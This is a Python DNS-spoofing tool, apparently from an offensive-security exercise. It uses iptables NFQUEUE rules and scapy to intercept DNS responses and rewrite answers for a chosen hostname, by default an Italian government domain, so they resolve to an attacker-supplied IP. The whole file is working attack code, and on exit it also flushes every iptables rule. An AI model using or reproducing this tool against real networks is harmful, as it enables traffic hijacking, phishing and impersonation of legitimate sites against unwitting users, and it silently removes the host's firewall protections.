import netfilterqueue
import scapy.all as scapy
import argparse
import subprocess

QNAME = "www.governo.it."
REDIRECT_IP = '10.0.2.10'


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-q', '--queue-local-forward', dest="queue", help='Queue [local/forward]')
    parser.add_argument('-n', '--queue-num', dest="queue_n", help='Queue num')
    parser.add_argument('-hN', '--host-name', dest="host_name", help='Host name')
    parser.add_argument('-i', '--redirect-ip', dest="redirect_ip", help='Redirect IP')
    options_from_parser = parser.parse_args()
    if not options_from_parser.queue:
        parser.error('[-] Please specify if queue is local or forward, use --help for more info.')
    if not options_from_parser.queue_n:
        parser.error('[-] Please specify a queue num, use --help for more info.')

    return options_from_parser


def modify_answer(qname, redirect_ip, scapy_packet):
    print('[+] Spoofing target ' + qname + ' to ' + redirect_ip)
    answer = scapy.DNSRR(rrname=qname, rdata=redirect_ip)
    scapy_packet[scapy.DNS].ancount = 1
    scapy_packet[scapy.DNS].an = answer
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.UDP].len
    del scapy_packet[scapy.UDP].chksum
    return scapy_packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        print('[+] Processing a packet')
        qname = scapy_packet[scapy.DNSQR].qname.decode("utf-8")
        if qname == QNAME:
            packet.set_payload(bytes(modify_answer(QNAME, REDIRECT_IP, scapy_packet)))

    packet.accept()


def start_attack(queue_num, queue_local_forward):
    if queue_local_forward == 'local' :
        subprocess.call(['sudo', 'iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', queue_num])
        subprocess.call(['sudo', 'iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', queue_num])
    elif queue_local_forward == 'forward':
        subprocess.call(['sudo', 'iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', queue_num])
    else:
        print('[-] Please specify if queue is local or forward!')
        return False

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(int(queue_num), process_packet)
    queue.run()


if __name__ == "__main__":
    try:
        options = get_arguments()
        if options.host_name:
            QNAME = options.host_name
        if options.redirect_ip:
            REDIRECT_IP = options.redirect_ip
        start_attack(options.queue_n, options.queue)
    except KeyboardInterrupt:
        subprocess.call(['sudo', 'iptables', '--flush'])
        print('\n[+] Ending the attack')